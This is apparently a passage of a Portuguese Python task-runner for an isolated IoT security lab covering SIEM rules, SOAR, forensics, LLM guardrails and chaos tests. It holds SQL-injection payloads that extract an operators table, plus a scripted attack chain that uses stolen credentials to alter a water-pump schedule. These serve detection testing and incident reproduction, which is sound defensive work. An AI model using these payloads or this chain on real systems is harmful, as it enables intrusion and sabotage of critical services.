                      "FROM eventos WHERE severidade='alta' ORDER BY ts DESC LIMIT 8")
    blocos.append("### Amostra de eventos de severidade alta\n" + amostra)
    for b in blocos:
        print(b)
    salvar_evidencia("B21_siem.txt", blocos)


REGRAS = {
    "login_vpn_anomalo": (
        "(a) Login administrativo/VPN anômalo (falha de autenticação no bastion)", "alta",
        "(fonte='so' AND host='hub-bastion' AND (mensagem ILIKE '%fail%' OR mensagem ILIKE '%invalid%')) "
        "OR (fonte='vpn' AND mensagem ILIKE '%fail%')"),
    "padrao_sql_injection": (
        "(b) Padrão de SQL Injection no tráfego web", "alta",
        "fonte='web' AND (mensagem ILIKE '%sql injection%' OR mensagem ILIKE '%union%select%' "
        "OR mensagem ILIKE '%access denied%' OR mensagem ILIKE '%942%' OR mensagem ILIKE '%949110%')"),
    "dispositivo_sem_certificado": (
        "(c) Dispositivo sem certificado válido no broker", "alta",
        "fonte='broker' AND (mensagem ILIKE '%certificate%' OR mensagem ILIKE '%tls%' "
        "OR mensagem ILIKE '%refused%' OR mensagem ILIKE '%unable to%' OR mensagem ILIKE '%error%')"),
    "comando_atuador_fora_do_perfil": (
        "(d) Comando de atuador fora do perfil/horário (bomba)", "alta",
        "fonte='web' AND (mensagem ILIKE '%acao=acesso_negado%bomba%' OR mensagem ILIKE '%altera_agendamento%')"),
}


def cmd_deteccao(acao: str = "status") -> None:
    siem_preparar()
    print("Gerando gatilhos de teste para as 4 regras (laboratório)...")
    run(["docker", "exec", "ops-ws", "python", "-c",
         "import urllib.request,urllib.parse as P\n"
         "try:\n urllib.request.urlopen('http://10.30.2.10:8080/historico?q='+"
         "P.quote(\"x' UNION SELECT NULL,NULL,username,perfil,NULL,NULL,NULL FROM operadores-- \"),timeout=10)\n"
         "except Exception as e: print('sqli->',e)"], check=False, capture=True)
    run(["docker", "run", "--rm", "--network", "vila_field_ubs", "--mount",
         f"type=bind,source={ROOT / 'pki' / 'out'},target=/pki,readonly", "eclipse-mosquitto:2.0",
         "mosquitto_pub", "-h", "broker", "-p", "8883", "--cafile", "/pki/ca-chain.crt",
         "-t", "vila/ubs/x/telemetria", "-m", "{}"], check=False, capture=True)
    run(["docker", "exec", "admin-ws", "sh", "-c",
         "ssh-keygen -q -t ed25519 -N '' -f /tmp/bad -C intruso 2>/dev/null; "
         "ssh -i /tmp/bad -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no "
         "-o ConnectTimeout=5 admin@10.30.3.10 true 2>&1 | head -1"], check=False, capture=True)
    try:
        u, senha, secret = credenciais_painel()["operador"]
        cliente("login", "http://10.30.2.20:8000", u, senha, "/trabalho/det.cookie", secret)
        cliente("post", "http://10.30.2.20:8000", "/bomba", "/trabalho/det.cookie",
                "id=1", "inicio=00:00", "fim=23:59")
    except Exception:
        pass
    time.sleep(3)
    siem_coletar()

    run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", "siem", "-c", "TRUNCATE alertas"],
        check=False, capture=True)
    for regra, (titulo, sev, cond) in REGRAS.items():
        psql_db("siem", f"INSERT INTO alertas (regra, severidade, fonte, host, detalhe, evento_ts, mttd_seg) "
                f"SELECT '{regra}', '{sev}', fonte, host, left(mensagem,120), ts, "
                f"round(EXTRACT(EPOCH FROM (now() - ts))::numeric, 1) FROM eventos "
                f"WHERE ts >= now() - interval '{SIEM_JANELA}' AND ({cond})")
    blocos = ["Detecção: 4 regras do RT-13 avaliadas sobre os eventos centralizados no SIEM.",
              "MTTD = tempo entre o evento e a geração do alerta (SIEM em lote)."]
    resumo = psql_db("siem", "SELECT regra, count(*) AS alertas, round(avg(mttd_seg),1) AS mttd_medio_seg, "
                     "max(severidade) AS sev FROM alertas GROUP BY regra ORDER BY regra")
    blocos.append("### Alertas por regra e MTTD\n" + resumo)
    for regra, (titulo, _, _) in REGRAS.items():
        ex = psql_db("siem", f"SELECT to_char(evento_ts,'HH24:MI:SS') h, host, left(detalhe,80) "
                     f"FROM alertas WHERE regra='{regra}' ORDER BY evento_ts DESC LIMIT 2")
        blocos.append(f"### {titulo}\n" + ex)
    for b in blocos:
        print(b)
    salvar_evidencia("B22_deteccao.txt", blocos)


SOAR_PLANO = {
    "login_vpn_anomalo": [("Encerrar a sessão VPN e bloquear o IP de origem", "baixo")],
    "padrao_sql_injection": [("Bloquear o IP de origem no firewall do hub", "baixo")],
    "dispositivo_sem_certificado": [("Isolar o dispositivo e revogar o certificado", "baixo")],
    "comando_atuador_fora_do_perfil": [("Colocar o atuador (bomba) em modo seguro", "baixo"),
                                       ("Desligar a bomba do abrigo durante a enchente", "alto")],
}


def cmd_soar(acao: str = "status") -> None:
    run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", "siem", "-c",
         "TRUNCATE soar_acoes"], check=False, capture=True)
    regras_ativas = [l.strip() for l in psql_db("siem",
                     "SELECT DISTINCT regra FROM alertas").splitlines()
                     if l.strip() and l.strip() in SOAR_PLANO]
    try:
        codigo = totp(segredo_totp())
    except Exception:
        codigo = "------"
    for regra in regras_ativas:
        aid = psql_escalar("siem", f"SELECT min(id) FROM alertas WHERE regra='{regra}'")
        aid = aid if aid.isdigit() else "NULL"
        for descr, risco in SOAR_PLANO[regra]:
            if risco == "baixo":
                psql_db("siem", "INSERT INTO soar_acoes (alerta_id, regra, acao, risco, status, aprovado_por, detalhe) "
                        f"VALUES ({aid}, '{regra}', '{descr}', 'baixo', 'executado', 'automação',"
                        " 'ação de baixo risco executada automaticamente')")
            else:
                psql_db("siem", "INSERT INTO soar_acoes (alerta_id, regra, acao, risco, status, aprovado_por, detalhe) "
                        f"VALUES ({aid}, '{regra}', '{descr}', 'alto', 'aguardando_aprovacao', NULL,"
                        " 'ação de alto impacto: exige aprovação humana com MFA')")
    blocos = ["SOAR em Python: ações de baixo risco automáticas; alto impacto exige aprovação humana com MFA (RT-15).",
              "### Fila de ações do SOAR\n" + psql_db("siem",
              "SELECT id, risco, status, acao FROM soar_acoes ORDER BY id")]
    pend = psql_escalar("siem", "SELECT id FROM soar_acoes WHERE status='aguardando_aprovacao' ORDER BY id LIMIT 1")
    if pend.isdigit():
        blocos.append(f"### Aprovação humana da ação de alto impacto (id {pend})\n"
                      f"Coordenação aprova com código MFA (TOTP) {codigo}:")
        psql_db("siem", f"UPDATE soar_acoes SET status='aprovado_e_executado', "
                f"aprovado_por='coordenacao (MFA {codigo})', "
                f"detalhe='aprovada manualmente pela coordenação com segundo fator' WHERE id={pend}")
        blocos.append(psql_db("siem", f"SELECT id, status, aprovado_por, acao FROM soar_acoes WHERE id={pend}"))
    blocos.append("### Trilha de auditoria final do SOAR\n" + psql_db("siem",
                  "SELECT risco, status, acao FROM soar_acoes ORDER BY risco DESC, id"))
    for b in blocos:
        print(b)
    salvar_evidencia("B23_soar.txt", blocos)


def _ts() -> str:
    return datetime.now().astimezone().isoformat(timespec="seconds")


def cmd_incidente(acao: str = "status") -> None:
    alvo = "http://10.30.2.21:8000"
    linha = []

    def passo(hora, fase, attack, detalhe):
        linha.append(f"{hora} | {fase} | {attack} | {detalhe}")
        print(linha[-1])

    psql_painel("UPDATE agendamentos_bomba SET hora_inicio='06:00', hora_fim='08:00', "
                "atualizado_por='carga' WHERE id=1")
    u, senha, _ = credenciais_painel()["operador"]

    passo(_ts(), "1. Phishing + voz clonada", "T1566 Phishing / T1534",
          f"E-mail falso da 'prefeitura' e audio com voz clonada levam a coordenadora a entregar a senha (ver B19); conta {u} comprometida")
    r = cliente("login", alvo, u, senha, "/trabalho/inc.cookie")
    passo(_ts(), "2. Login na VPN/painel legado", "T1078 Valid Accounts",
          f"Login no painel legado com a credencial roubada (sem MFA): status={_status_cookie(r)}")
    ext = ("import urllib.request as R,http.cookiejar as C,urllib.parse as P,re;"
           "j=C.MozillaCookieJar('/trabalho/inc.cookie');j.load(ignore_discard=True,ignore_expires=True);"
           "o=R.build_opener(R.HTTPCookieProcessor(j));"
           "u='http://10.30.2.21:8000/historico?q='+P.quote("
           "\"zzz' UNION SELECT NULL,NULL,username,perfil,NULL,NULL,NULL FROM operadores-- \")+'&espaco=';"
           "t=o.open(u,timeout=20).read().decode();"
           "print(len(re.findall(r'<tr>(.*?)</tr>',t,re.S)))")
    rx = run(["docker", "exec", "ops-ws", "python", "-c", ext], check=False, capture=True)
    passo(_ts(), "3. SQL Injection no historico", "T1190 Exploit Public-Facing App",
          f"SQLi no campo de busca extrai a tabela de operadores (~{rx.stdout.strip()} registros vazados)")
    cliente("post", alvo, "/bomba", "/trabalho/inc.cookie", "id=1", "inicio=00:00", "fim=23:59")
    dep = psql_escalar("painel", "SELECT hora_inicio||'-'||hora_fim FROM agendamentos_bomba WHERE id=1")
    passo(_ts(), "4. Alteracao do agendamento da bomba", "T1565 Data Manipulation",
          f"Agendamento da bomba da escola alterado para {dep}; reservatorio esvazia de madrugada")
    run(["docker", "exec", "ubs-broker", "mosquitto_pub", "-h", "localhost", "-p", "8883",
         "--cafile", "/monitor/ca-chain.crt", "--cert", "/monitor/monitor.crt", "--key", "/monitor/monitor.key",
         "-t", "vila/ubs/sim/cenario", "-q", "1", "-m", '{"tipo": "falha_refrigeracao"}'], check=False, capture=True)
    link("ubs", "tudo", "down")
    time.sleep(25)
    st = run(["docker", "exec", "ubs-agent", "cat", "/data/status.json"], check=False, capture=True)
    lg = run(["docker", "logs", "--tail", "40", "ubs-agent"], check=False, capture=True)
    tem_alarme = "ALARME LOCAL" in (lg.stdout + lg.stderr)
    alarmes = "disparado na borda" if tem_alarme or '"ativo": true' in st.stdout else "nao disparado no intervalo"
    passo(_ts(), "5. Queda do link + camara fria", "T0826 Loss of Availability",
          f"Fibra+4G derrubados durante o incidente; camara fria de vacinas em falha_refrigeracao, alarme {alarmes} "
          "(no incidente real nao havia operacao local, e a temperatura saiu da faixa sem aviso)")
    cliente("post", alvo.replace("8000", "8000"), "/bomba", "/trabalho/inc.cookie", "id=1", "inicio=06:00", "fim=08:00")
    run(["docker", "exec", "ubs-broker", "mosquitto_pub", "-h", "localhost", "-p", "8883",
         "--cafile", "/monitor/ca-chain.crt", "--cert", "/monitor/monitor.crt", "--key", "/monitor/monitor.key",
         "-t", "vila/ubs/sim/cenario", "-q", "1", "-m", '{"tipo": null}'], check=False, capture=True)
    link("ubs", "tudo", "up")

    blocos = ["Reproducao controlada do incidente INC-VA-0712 (ambiente isolado, dados sinteticos).",
              "### Linha do tempo da cadeia de ataque (hora | fase | MITRE ATT&CK | detalhe)\n" + "\n".join(linha),
              "Observacao: a correcao da arquitetura (mTLS, MFA, RBAC, WAF, operacao local na borda, SIEM) "
              "quebra cada elo desta cadeia nos lotes B05-B23."]
    salvar_evidencia("B24_incidente.txt", blocos)
    print("\nCadeia completa executada. Ambiente restaurado.")


def _status_cookie(r) -> str:
    saida = (r.stdout + r.stderr)
    for tok in saida.split():
        if tok.startswith("status="):
            return tok.split("=")[1]
    return "?"


ATTACK_FORENSE = [
    ("Initial Access", "Phishing", "T1566", "E-mail falso + voz clonada (B19/B24)"),
    ("Initial Access", "Valid Accounts", "T1078", "Login sem MFA com credencial roubada (B24)"),
    ("Initial Access", "Exploit Public-Facing Application", "T1190", "SQL Injection no painel (B14/B24)"),
    ("Impact", "Data Manipulation", "T1565", "Alteracao do agendamento da bomba (B14/B24)"),
    ("Impact", "Loss of Availability", "T0826", "Queda de link + camara fria sem alarme (B24)"),
    ("Defense Evasion", "Indicator Removal", "T1070", "Logs dispersos e dessincronizados no incidente original"),
]


def cmd_forense(acao: str = "status") -> None:
    import hashlib
    ev = ROOT / "docs" / "evidencias"
    custodia = []
    for arq in sorted(ev.glob("*.txt")):
        dados = arq.read_bytes()
        custodia.append((arq.name, len(dados), hashlib.sha256(dados).hexdigest()))
    linhas = ["## CUSTODIA"]
    linhas += [f"{n}\t{b}\t{h}" for n, b, h in custodia]
    linhas.append("## TIMELINE")
    tl = psql_db("siem", "SELECT to_char(ts,'YYYY-MM-DD HH24:MI:SS'), fonte, severidade, left(mensagem,90) "
                 "FROM eventos WHERE severidade='alta' ORDER BY ts DESC LIMIT 25")
    for l in tl.splitlines():
        if "|" in l and "---" not in l and "fonte" not in l and "rows)" not in l:
            linhas.append("\t".join(x.strip() for x in l.split("|")))
    linhas.append("## ALERTAS")
    al = psql_db("siem", "SELECT regra, count(*), round(avg(mttd_seg),1) FROM alertas GROUP BY regra ORDER BY regra")
    for l in al.splitlines():
        if "|" in l and "---" not in l and "regra" not in l and "rows)" not in l:
            linhas.append("\t".join(x.strip() for x in l.split("|")))
    linhas.append("## ATTACK")
    linhas += ["\t".join(x) for x in ATTACK_FORENSE]

    dados_txt = "\n".join(linhas)
    (ev / "B25_forense_dados.txt").write_text(dados_txt, encoding="utf-8")
    resumo = [f"Laudo forense do INC-VA-0712 (dados para o PDF E4). Coleta em {_ts()}.",
              f"Itens sob cadeia de custodia (SHA-256): {len(custodia)}",
              "### Cadeia de custodia (arquivo | bytes | sha256)\n" +
              "\n".join(f"{n}  {b}B  {h[:16]}..." for n, b, h in custodia),
              "### Dados estruturados salvos em docs/evidencias/B25_forense_dados.txt"]
    for b in resumo:
        print(b)
    salvar_evidencia("B25_forense.txt", resumo)


def _injetar_cenario(site: str, tipo: str) -> None:
    run(["docker", "exec", f"{site}-broker", "mosquitto_pub", "-h", "localhost", "-p", "8883",
         "--cafile", "/monitor/ca-chain.crt", "--cert", "/monitor/monitor.crt", "--key", "/monitor/monitor.key",
         "-t", f"vila/{site}/sim/cenario", "-q", "1", "-m",
         json.dumps({"tipo": None if tipo == "normal" else tipo})], check=False, capture=True)


def cmd_anomalia(acao: str = "status") -> None:
    saida = ROOT / "ai" / "anomaly" / "out"
    saida.mkdir(parents=True, exist_ok=True)
    cenarios = [("ubs", "falha_refrigeracao"), ("escola", "vazamento"), ("abrigo", "chuva_forte"),
                ("centro", "pico_consumo"), ("horta", "pico_consumo")]
    print("Experimento controlado: reiniciando sensores (reset de estado)...")
    reiniciar([f"{s}-sensores" for s in SITES])
    time.sleep(20)
    inicio = datetime.now().astimezone().isoformat(timespec="seconds")
    print("Coletando ~80 s de operação normal...")
    time.sleep(80)
    for site, tipo in cenarios:
        _injetar_cenario(site, tipo)
    print("Cenários de falha injetados; coletando mais ~70 s...")
    time.sleep(70)
    for site, _ in cenarios:
        _injetar_cenario(site, "normal")
    r = run(["docker", "exec", "hub-postgres", "psql", "-U", "vila_admin", "-d", "vila", "-c",
             f"\\copy (SELECT device_id, site, tipo, ts, payload FROM telemetria WHERE ts >= '{inicio}') "
             "TO STDOUT WITH CSV HEADER"], check=False, capture=True)
    (saida / "telemetria.csv").write_text(r.stdout, encoding="utf-8")
    nlin = r.stdout.count("\n")
    print(f"Telemetria da janela do experimento exportada: {nlin} linhas")
    run(["docker", "build", "-q", "-t", "vila/ai-anomaly:1", str(ROOT / "ai" / "anomaly")], check=False)
    r = run(["docker", "run", "--rm", "-v", f"{saida}:/dados", "-v", f"{saida}:/saida",
             "-e", "CSV=/dados/telemetria.csv", "-e", "SAIDA=/saida", "vila/ai-anomaly:1"],
            check=False, capture=True)
    blocos = ["Detecção de anomalias na telemetria com Isolation Forest (scikit-learn), por tipo de sensor.",
              "Verdade-terrestre = regras físicas de segurança (mesma lógica do alarme da borda, B08).",
              "### Métricas (precisão, revocação, F1, falsos positivos)\n" + (r.stdout + r.stderr).strip()]
    for b in blocos:
        print(b)
    salvar_evidencia("B26_anomalia.txt", blocos)


def _ollama_tem_modelo() -> bool:
    r = run(["docker", "exec", "vila-ollama", "ollama", "list"], check=False, capture=True)
    return r.returncode == 0 and LLM_MODEL.split(":")[0] in r.stdout


def _llm_preparar() -> None:
    # Rede isolada: internal => sem rota para dispositivos nem internet (RT-17 / OWASP LLM08).
    run(["docker", "network", "create", "--internal", "--subnet", "10.60.0.0/24", "vila_ai"],
        check=False, capture=True)
    run(["docker", "volume", "create", "vila_ollama"], check=False, capture=True)
    existe = run(["docker", "ps", "-a", "--filter", "name=^vila-ollama$", "--format", "{{.Names}}"],
                 check=False, capture=True).stdout.strip()
    if existe != "vila-ollama":
        run(["docker", "run", "-d", "--name", "vila-ollama", "--network", "vila_ai",
             "-v", "vila_ollama:/root/.ollama", "ollama/ollama:latest"], check=False)
        time.sleep(6)
    else:
        run(["docker", "start", "vila-ollama"], check=False, capture=True)
        time.sleep(4)
    if not _ollama_tem_modelo():
        print(f"Modelo {LLM_MODEL} ausente; baixando (internet temporária só para o pull)...")
        run(["docker", "network", "connect", "bridge", "vila-ollama"], check=False, capture=True)
        rc = run(["docker", "exec", "vila-ollama", "ollama", "pull", LLM_MODEL], check=False).returncode
        run(["docker", "network", "disconnect", "bridge", "vila-ollama"], check=False, capture=True)
        if rc != 0 or not _ollama_tem_modelo():
            print("Falha ao baixar o modelo. Verifique a conexão do Docker Desktop.")
            return
    # Prova de isolamento: vila-ollama deve estar SOMENTE na rede vila_ai.
    redes = run(["docker", "inspect", "-f",
                 "{{range $k, $v := .NetworkSettings.Networks}}{{$k}} {{end}}", "vila-ollama"],
                check=False, capture=True).stdout.strip()
    print(f"Redes de vila-ollama (isolamento RT-17): {redes}")
    interno = run(["docker", "network", "inspect", "-f", "{{.Internal}}", "vila_ai"],
                  check=False, capture=True).stdout.strip()
    print(f"vila_ai internal={interno} (sem rota para a internet nem para os dispositivos)")
    # Smoke test: o servidor responde a uma geração mínima.
    sm = run(["docker", "exec", "vila-ollama", "ollama", "run", LLM_MODEL, "responda apenas: ok"],
             check=False, capture=True)
    print("Smoke test do LLM:", (sm.stdout or sm.stderr).strip()[:80])


def _llm_testar() -> None:
    saida = ROOT / "ai" / "llm-assistant" / "out"
    saida.mkdir(parents=True, exist_ok=True)
    run(["docker", "build", "-q", "-t", "vila/ai-assistant:1", str(ROOT / "ai" / "llm-assistant")],
        check=False)
    r = run(["docker", "run", "--rm", "--network", "vila_ai",
             "-e", "OLLAMA_URL=http://vila-ollama:11434", "-e", f"MODELO={LLM_MODEL}",
             "-e", "SAIDA=/saida", "-v", f"{saida}:/saida", "vila/ai-assistant:1"],
            check=False, capture=True)
    print(r.stdout)
    if r.stderr.strip():
        print(r.stderr)
    jsonl = saida / "b27_testes.jsonl"
    detalhe = jsonl.read_text(encoding="utf-8") if jsonl.exists() else "(sem log)"
    blocos = [
        "Assistente de IA local (Ollama, " + LLM_MODEL + ") com guardrails determinísticos.",
        "Arquitetura de isolamento (RT-17): LLM e assistente só na rede vila_ai (internal); "
        "nenhuma ferramenta de atuação é exposta ao modelo - ele só produz texto.",
        "Camadas: entrada (injeção direta/indireta, jailbreak, atuação) + saída (redige segredos/PII, "
        "sinaliza atuação). Mapeado a OWASP LLM Top 10 (LLM01/02/06/08) e MITRE ATLAS.",
        "### Saída dos 10 testes de injeção/vazamento\n" + r.stdout.strip(),
        "### Registro estruturado (JSONL)\n" + detalhe.strip(),
    ]
    salvar_evidencia("B27_llm_guardrails.txt", blocos)


def cmd_llm(acao: str = "all") -> None:
    _llm_preparar()
    if acao != "preparar":
        if not _ollama_tem_modelo():
            print("Modelo indisponível; pulei os testes. Rode: python tasks.py llm preparar")
            return
        _llm_testar()


# ---- B29/B30: métricas (RT-22) e teste de caos (RT-23) ----

# Referência de energia do nó de borda: Raspberry Pi 4 (estimativa, não medição real).
BORDA_P_IDLE_W, BORDA_P_MAX_W, BORDA_NUCLEOS = 2.7, 6.4, 4


def _tamanho_para_bytes(txt: str) -> float:
    txt = txt.strip()
    m = re.match(r"([0-9.]+)\s*([KMGT]?i?B)", txt)
    if not m:
        return 0.0
    val, uni = float(m.group(1)), m.group(2)
    fator = {"B": 1, "kB": 1e3, "KB": 1e3, "MB": 1e6, "GB": 1e9, "TB": 1e12,
             "KiB": 1024, "MiB": 1024**2, "GiB": 1024**3, "TiB": 1024**4}.get(uni, 1)
    return val * fator


def _status_sites() -> dict:
    out = {}
    for s in SITES:
        try:
            out[s] = json.loads(status_agente(s) or "{}")
        except ValueError:
            out[s] = {}
    return out


def _recursos_borda(site: str = "ubs") -> dict:
    """docker stats de um nó de borda; banda por delta de NET I/O em ~15 s. Energia estimada."""
    conts = [f"{site}-{c}" for c in ("agent", "broker", "sensores", "vpn", "ntp")]
    fmt = "{{.Name}};{{.CPUPerc}};{{.MemUsage}};{{.NetIO}}"

    def amostra():
        r = run(["docker", "stats", "--no-stream", "--format", fmt, *conts], check=False, capture=True)
        linhas = {}
        for ln in r.stdout.strip().splitlines():
            p = ln.split(";")
            if len(p) == 4:
                cpu = float(p[1].replace("%", "") or 0)
                mem = _tamanho_para_bytes(p[2].split("/")[0])
                net = sum(_tamanho_para_bytes(x) for x in p[3].split("/"))
                linhas[p[0]] = {"cpu": cpu, "mem": mem, "net": net}
        return linhas

    a1 = amostra()
    time.sleep(15)
    a2 = amostra()
    cpu_total = sum(v["cpu"] for v in a2.values())
    mem_total = sum(v["mem"] for v in a2.values())
    banda = sum(a2[c]["net"] - a1.get(c, {"net": a2[c]["net"]})["net"] for c in a2) / 15.0
    frac = min(cpu_total / (BORDA_NUCLEOS * 100), 1.0)
    potencia = BORDA_P_IDLE_W + (BORDA_P_MAX_W - BORDA_P_IDLE_W) * frac
    return {
        "site": site,
        "cpu_total_pct": round(cpu_total, 1),
        "mem_total_mb": round(mem_total / 1e6, 1),
        "banda_kbps": round(banda * 8 / 1e3, 1),
        "potencia_estimada_w": round(potencia, 2),
        "energia_dia_wh": round(potencia * 24, 1),
        "por_container": {c: {"cpu_pct": a2[c]["cpu"], "mem_mb": round(a2[c]["mem"] / 1e6, 1)} for c in a2},
    }


def cmd_caos(minutos: float = 45) -> None:
    saida = ROOT / "metrics" / "resultados"
    saida.mkdir(parents=True, exist_ok=True)
    inicio = datetime.now().astimezone().isoformat(timespec="seconds")
    t0 = time.time()
    print(f"Teste de caos (RT-23): queda total de WAN (fibra+4g) nos {len(SITES)} espaços por {minutos} min.")
    for s in SITES:
        link(s, "tudo", "down")
    time.sleep(8)
    for s in SITES:
        cmd_cenario(s, CENARIO_PADRAO[s])

    # MTTD local: tempo da injeção até o alarme local ficar ativo, por espaço
    mttd, pendentes, td0 = {}, set(SITES), time.time()
    while pendentes and time.time() - td0 < 120:
        for s in list(pendentes):
            try:
                st = json.loads(status_agente(s) or "{}")
            except ValueError:
                st = {}
            if st.get("alarmes_ativos"):
                mttd[s] = round(time.time() - td0, 1)
                pendentes.discard(s)
        if pendentes:
            time.sleep(5)
    for s in pendentes:
        mttd[s] = None
    print("MTTD local (s):", mttd)

    # Linha do tempo durante a janela autônoma + snapshot de recursos no meio
    timeline, recursos = [], None
    fim = t0 + minutos * 60
    while time.time() < fim:
        snap = _status_sites()
        amostra = {"t": round(time.time() - t0), "sites": {
            s: {"hub_online": snap[s].get("hub_online"), "fila": snap[s].get("fila_pendente"),
                "alarmes": len(snap[s].get("alarmes_ativos", []))} for s in SITES}}
        timeline.append(amostra)
        print(f"t+{amostra['t']}s | " + " | ".join(
            f"{s}:hub={amostra['sites'][s]['hub_online']},fila={amostra['sites'][s]['fila']},al={amostra['sites'][s]['alarmes']}"
            for s in SITES))
        if recursos is None and time.time() - t0 > minutos * 60 * 0.4:
            recursos = _recursos_borda("ubs")
            print("Recursos do nó de borda (ubs):", recursos)
        time.sleep(60)
    if recursos is None:
        recursos = _recursos_borda("ubs")

    total = max(len(timeline), 1)
    offline = sum(1 for a in timeline if all(a["sites"][s]["hub_online"] is False for s in SITES))
    local_ok = sum(1 for a in timeline if all(a["sites"][s]["fila"] is not None for s in SITES))
    disp_local = round(100 * local_ok / total, 1)
    autonomia_min = round(offline * 60 / 60.0, 1)

    # Reconciliação: religa, mede tempo até fila zerar e hub online em todos
    for s in SITES:
        cmd_cenario(s, "normal")
    for s in SITES:
        link(s, "tudo", "up")
    print("Links restabelecidos; medindo reconciliação...")
    tr0, reconc = time.time(), False
    while time.time() - tr0 < 240:
        snap = _status_sites()
        if all(snap[s].get("hub_online") and snap[s].get("fila_pendente") == 0 for s in SITES):
            reconc = True
            break
        time.sleep(10)
    mttr = round(time.time() - tr0, 1) if reconc else None
    time.sleep(20)

    perda = psql_escalar("vila",
                         "SELECT COALESCE(SUM(perdidos),0) FROM (SELECT max(seq)-min(seq)+1-count(*) AS perdidos "
                         f"FROM telemetria WHERE ts >= '{inicio}' GROUP BY site, device_id, boot) t")
    lac = "\n".join(f"### {s}\n" + psql(lacunas_sql(s, inicio)) for s in SITES)

    vals = [v for v in mttd.values() if v is not None]
    resumo = {
        "inicio": inicio, "minutos": minutos,
        "disponibilidade_local_pct": disp_local,
        "operacao_autonoma_min": autonomia_min,
        "mttd_medio_s": round(sum(vals) / len(vals), 1) if vals else None,
        "mttd_por_site": mttd,
        "mttr_reconciliacao_s": mttr,
        "perda_dados_reconciliacao": int(perda or 0),
        "recursos_borda": recursos,
        "amostras": total,
    }
    (saida / "caos.json").write_text(json.dumps(resumo, ensure_ascii=False, indent=2), encoding="utf-8")
    blocos = [
        f"Teste de caos controlado (RT-23): WAN derrubada nos {len(SITES)} espaços por {minutos} min.",
        "### Resultado consolidado\n" + json.dumps(resumo, ensure_ascii=False, indent=2),
        "### Perda de dados por espaço (lacunas de seq após reconciliação)\n" + lac,
        "### Linha do tempo (amostras a cada 60 s)\n" + "\n".join(
            f"t+{a['t']}s " + " ".join(f"{s}:hub={a['sites'][s]['hub_online']},fila={a['sites'][s]['fila']},al={a['sites'][s]['alarmes']}" for s in SITES)
            for a in timeline),
    ]
    for b in blocos[:2]:
        print(b)
    salvar_evidencia("B30_caos.txt", blocos)


def cmd_metricas(acao: str = "all") -> None:
    saida = ROOT / "metrics" / "resultados"
    caos = saida / "caos.json"
    dados = json.loads(caos.read_text(encoding="utf-8")) if caos.exists() else None
    recursos = _recursos_borda("ubs")

    linhas = ["### Métricas do nó de borda (RT-22) — medição ao vivo",
              f"CPU total (5 contêineres de borda): {recursos['cpu_total_pct']} %",
              f"Memória total: {recursos['mem_total_mb']} MB",
              f"Banda (NET I/O agregada): {recursos['banda_kbps']} kbps",
              f"Energia (ESTIMATIVA, Raspberry Pi 4 {BORDA_P_IDLE_W}-{BORDA_P_MAX_W} W, "
              f"{BORDA_NUCLEOS} núcleos): {recursos['potencia_estimada_w']} W  (~{recursos['energia_dia_wh']} Wh/dia)",
              "  * Energia não é medida em watts reais no laboratório containerizado; estimada a partir "
              "do uso de CPU sobre o TDP de uma placa de referência. Medição real exigiria hardware (diferencial do briefing)."]

    if dados:
        linhas += ["", "### Resiliência e detecção (do teste de caos, RT-22/RT-23)",
                   f"Disponibilidade local durante a queda: {dados['disponibilidade_local_pct']} %",
                   f"Operação autônoma sem internet: {dados['operacao_autonoma_min']} min",
                   f"MTTD local médio: {dados['mttd_medio_s']} s  (por espaço: {dados['mttd_por_site']})",
                   f"MTTR de reconciliação: {dados['mttr_reconciliacao_s']} s",
                   f"Perda de dados na reconciliação: {dados['perda_dados_reconciliacao']} leituras"]
    else:
        linhas += ["", "### Resiliência e detecção",
                   "Rode 'python tasks.py caos 45' para medir disponibilidade, MTTD, MTTR, "
                   "operação autônoma e perda de dados na reconciliação."]
    texto = "\n".join(linhas)
    print(texto)
    salvar_evidencia("B29_metricas.txt", [texto])


# ---- B31: pseudonimização HMAC dos registros de acesso (RT-19) ----

def _chave_ripd() -> bytes:
    f = INFRA / "ripd" / "out" / "chave.bin"
    f.parent.mkdir(parents=True, exist_ok=True)
    if not f.exists():
        f.write_bytes(secrets.token_bytes(32))
    return f.read_bytes()


def _pseudo(valor: str, chave: bytes) -> str:
    return "p_" + hmac.new(chave, valor.encode("utf-8"), hashlib.sha256).hexdigest()[:16]


def cmd_ripd(acao: str = "demo") -> None:
    chave = _chave_ripd()
    acessos = [
        ("ana.voluntaria", "203.0.113.11", "login"),
        ("joao.tecnico", "203.0.113.24", "consulta_historico"),
        ("ana.voluntaria", "203.0.113.11", "alterar_agendamento_bomba"),
        ("maria.coord", "198.51.100.7", "login"),
        ("joao.tecnico", "203.0.113.24", "exportar_relatorio"),
    ]
    linhas = ["reg | usuario -> pseudonimo | ip -> pseudonimo | acao"]
    for i, (u, ip, ac) in enumerate(acessos, 1):
        linhas.append(f"{i:02d}  | {u} -> {_pseudo(u, chave)} | {ip} -> {_pseudo(ip, chave)} | {ac}")
    consistente = _pseudo("ana.voluntaria", chave) == _pseudo("ana.voluntaria", chave)
    blocos = [
        "Pseudonimização dos registros de acesso (RT-19 / LGPD art. 13).",
        "Técnica: pseudônimo = HMAC-SHA256(chave_secreta, identificador). A chave fica fora do "
        "versionamento (infra/ripd/out/chave.bin, no .gitignore). Sem a chave não há reversão "
        "(resistência de pré-imagem do HMAC, Aula 02); com a chave, a associação reidentifica "
        "quando legalmente necessário.",
        "### Registros de acesso pseudonimizados\n" + "\n".join(linhas),
        f"Consistência (mesmo identificador -> mesmo pseudônimo, permite auditoria sem expor a "
        f"identidade): {consistente}",
        "É pseudonimização (reversível apenas com a chave), não anonimização: o pseudônimo é um HMAC "
        "de 256 bits truncado e os dados publicados não trazem tabela reversa.",
    ]
    for b in blocos:
        print(b)
    salvar_evidencia("B31_pseudonimizacao.txt", blocos)


# ---- B34: atualização OTA assinada com Ed25519 (diferencial) ----

def cmd_ota(acao: str = "demo") -> None:
    saida = INFRA / "ota" / "out"
    saida.mkdir(parents=True, exist_ok=True)
    run(["docker", "build", "-q", "-t", "vila/ota:1", str(INFRA / "ota")], check=False)
    r = run(["docker", "run", "--rm", "-v", f"{saida}:/saida", "-e", "SAIDA=/saida", "vila/ota:1"],
            check=False, capture=True)
    print(r.stdout)
    if r.stderr.strip():
        print(r.stderr)
    blocos = [
        "Atualização OTA assinada com Ed25519 (diferencial, RT de manutenção): o dispositivo só aplica "
        "um pacote cuja assinatura confere com a chave pública embarcada. A chave privada de assinatura "
